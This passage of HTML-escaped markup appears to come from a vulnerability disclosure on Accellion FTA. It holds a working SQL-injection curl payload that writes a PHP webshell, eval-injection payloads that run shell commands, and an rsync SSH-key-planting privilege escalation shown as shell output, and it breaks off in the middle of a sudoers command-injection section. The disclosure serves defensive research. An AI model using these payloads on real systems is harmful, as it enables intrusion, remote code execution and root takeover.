        &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;user&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;mysql_real_escape_string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;user&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$where_clause&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;t_mail_server.c_user_id LIKE \&apos;&apos;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;user&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;\&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;The parameters passed onto the function &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;client_properties( ... )&lt;/code&gt;  will be assembled into SQL statements. Among all the functions joining the assembling, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;construct_where_clause( ... )&lt;/code&gt; is the most crucial one.&lt;br /&gt;
In the function &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;construct_where_clause( ... )&lt;/code&gt;, every parameter is protected by the string &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mysql_real_escape_string&lt;/code&gt; except for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$client_id&lt;/code&gt;. Judging from the coding style of the source code, it might be a result of oversight. Therefore, SQL Injection can be triggered by sending out corresponding parameters according to the program flow.&lt;/p&gt;

&lt;p&gt;In addition, FTA database user has root privileges with FILE_PRIV option enabled. By exploiting &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;INTO OUTFILE&lt;/code&gt; and writing their own PHP code to write-enabled directory, user will be able to execute code remotely!&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;PoC&lt;/strong&gt;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl https://&amp;lt;fta&amp;gt;/courier/1000@/security_key2.api &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;aid=1000&amp;amp;user_id=1&amp;amp;password=1&amp;amp;client_id=&apos; OR 1=1 LIMIT 1 INTO OUTFILE &apos;/home/seos/courier/themes/templates/.cc.php&apos; LINES TERMINATED BY 0x3c3f...#&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;The created PHP file will be located at&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;http://&amp;lt;fta&amp;gt;/courier/themes/templates/.cc.php&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;known-secret-key-leads-to-remote-code-execution&quot;&gt;Known-Secret-Key leads to Remote Code Execution&lt;/h4&gt;

&lt;p&gt;In the previous vulnerability, one requirement to execute code remotely is the existence of a write-enabled directory for injecting webshell. But in reality, chances are there is no write-enabled directory available, thus fail to execute code through SQL Injection. But there is another way to help us accomplish RCE.&lt;/p&gt;

&lt;p&gt;The precondition of this vulnerability is &lt;strong&gt;Known-Secret-Key stored in the database&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;This is not a problem, since the database can be accessed with the SQL Injection vulnerability mentioned earlier. Also, although there are some parameter filters in the code, they can be bypassed!&lt;/p&gt;

&lt;div class=&quot;highlight-name&quot;&gt;/home/seos/courier/sfUtils.api&lt;/div&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;decrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;fc&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$orig_func&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;preg_match&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;/(.+)\(.*\)/&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$func_match&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$orig_func&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$func_match&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$cs_method&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;delete_session_cache&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;delete_user_contact&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;valid_password&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;user_password_update_disallowed&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;user_password_format_disallowed&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;get_user_contact_list&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;user_email_verified&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;user_exist_allow_direct_download&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;user_profile_auth&apos;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;in_array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$cs_method&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$orig_func&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$orig_func&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;get_user_contact_list&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_csinfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;user_id&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;preg_match&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;/[\\\/&quot;\*\:\?\&amp;lt;\&amp;gt;\|&amp;amp;]/&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;name&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;echo(count(&apos;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;(&quot;&apos;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_csinfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;user_id&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&quot;, array(&quot;nickname&quot;=&amp;gt;&quot;&apos;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;addslashes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;name&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&quot;))));&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;p1&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$func_param&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;  &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$p_no&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

        &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;p&apos;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$p_no&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;nv&quot;&gt;$func_param&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str_replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;\&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;\\\&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str_replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;$&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;\\$&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;addslashes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;p&apos;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$p_no&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$p_no&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;echo(&apos;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;(&quot;&apos;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&quot;, &quot;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$func_param&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&quot;));&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;eval&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;If Known-Secret-Key has been acquired, the output of decrypt( $_POST[fc] ) will be controllable. And despite that the succeeding regular expressions work as a function name whitelist filter, they do not filter parameters.&lt;br /&gt;
Therefore, the only restriction for injecting random codes in the parameters is to exclude &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;(&lt;/code&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;)&lt;/code&gt; in the strings. But thanks to the flexible characteristic of PHP, there are lots of ways to manipulate, just to name two examples here.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;
Execute system commands directly by using backticks (`)&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;user_profile_auth(`$_POST[cmd]`);
&lt;br /&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;A more elegant way: use the syntax INCLUDE to include the tmp_name of the uploaded files, so that any protection will give way.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;user_profile_auth(include $_FILES[file][tmp_name]);&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;local-privilege-escalation-cve-2016-2352-and-cve-2016-2353&quot;&gt;Local Privilege Escalation (CVE-2016-2352 and CVE-2016-2353)&lt;/h4&gt;
&lt;p&gt;After gaining PHP page privileges, we discovered that the privileges were assigned to user nobody. In order to engage in advanced recon, the web environment had been observed. After the observation, two possible privilege escalation vulnerabilities were identified.&lt;/p&gt;

&lt;h5 id=&quot;1-incorrect-rsync-configuration&quot;&gt;1. Incorrect Rsync Configuration&lt;/h5&gt;

&lt;div class=&quot;highlight-name&quot;&gt;/etc/opt/rsyncd.conf&lt;/div&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-lighttpd&quot; data-lang=&quot;lighttpd&quot;&gt;log file = /home/soggycat/log/kennel.log
...
[soggycat]
path = /home/soggycat
uid = soggycat
read only = false
list = false
...&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;The module name soggycat is readable and writable to anyone for the directory &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/home/soggycat/&lt;/code&gt;, therefore the SSH Key can be written into &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/home/soggycat/.ssh/&lt;/code&gt; and then use the soggycat credential to login.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;99&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;nobody&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;99&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;nobody&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;99&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;nobody&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;rsync 0::soggycat/.ssh/
drwx------        4096 2016/01/29 18:13:41 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;         606 2016/01/29 18:13:41 authorized_keys

bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;rsync 0::soggycat/.ssh/authorized_keys &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;id_dsa.pub &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; authorized_keys
bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;rsync authorized_keys 0::soggycat/.ssh/

bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; id_dsa &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;UserKnownHostsFile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/dev/null &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;StrictHostKeyChecking&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;no soggycat@localhost &lt;span class=&quot;nb&quot;&gt;id
&lt;/span&gt;Could not create directory &lt;span class=&quot;s1&quot;&gt;&apos;/.ssh&apos;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Warning: Permanently added &lt;span class=&quot;s1&quot;&gt;&apos;0,0.0.0.0&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; to the list of known hosts.
&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;520&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;soggycat&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;99&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;nobody&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;99&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;nobody&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h5 id=&quot;2-command-injection-in-yum-clientpl&quot;&gt;2. Command Injection in â€œyum-client.plâ€&lt;/h5&gt;

&lt;p&gt;To enable system updates through web UI, the sudoers configuration in FTA exceptionally allows the user nobody to directly execute commands with root privileges and update software with the program &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;yum-client.pl&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;highlight-name&quot;&gt;/etc/sudoers&lt;/div&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-apache&quot; data-lang=&quot;apache&quot;&gt;&lt;span class=&quot;err&quot;&gt;...&lt;/span&gt;
Cmnd_Alias      YUM_UPGRADE = /usr/bin/yum -y upgrade
Cmnd_Alias      YUM_CLIENT = /usr/local/bin/yum-client.pl
&lt;span class=&quot;err&quot;&gt;...&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# User privilege specification&lt;/span&gt;
root     ALL=(ALL) &lt;span class=&quot;ss&quot;&gt;ALL&lt;/span&gt;
admin    &lt;span class=&quot;ss&quot;&gt;ALL&lt;/span&gt; =NOPASSWD: UPDATE_DNS, UPDATE_GW, UPDATE_NTP, RESTART_NETWORK, CHMOD_OLDTEMP ...
nobody   &lt;span class=&quot;ss&quot;&gt;ALL&lt;/span&gt; =NOPASSWD: SSL_SYSTEM, ADMIN_SYSTEM, IPSEC_CMD, YUM_CLIENT
soggycat &lt;span class=&quot;ss&quot;&gt;ALL&lt;/span&gt; =NOPASSWD: ADMIN_SYSTEM, IPSEC_CMD, CHOWN_IPSEC, UPDATE_IPSEC, YUM_CLIENT
radmin   &lt;span class=&quot;ss&quot;&gt;ALL&lt;/span&gt; =NOPASSWD: RESET_APPL
&lt;span class=&quot;err&quot;&gt;...&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;YUM_CLIENT&lt;/code&gt; is the command for proceeding updates. Part of the codes are as follows:&lt;/p&gt;

&lt;div class=&quot;highlight-name&quot;&gt;/usr/local/bin/yum-client.pl&lt;/div&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-perl&quot; data-lang=&quot;perl&quot;&gt;&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;GetOptions&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
